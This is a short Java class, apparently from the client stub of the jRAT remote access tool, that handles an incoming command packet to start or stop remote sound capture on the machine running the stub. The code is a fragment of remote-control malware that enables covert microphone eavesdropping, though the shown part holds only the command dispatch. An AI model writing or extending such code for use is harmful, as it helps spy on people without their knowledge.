package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Sound;

public class Packet84SoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readBoolean()) {
			new Thread(new Sound()).start();
		} else {
			Sound.instance.running = false;
		}
	}

}
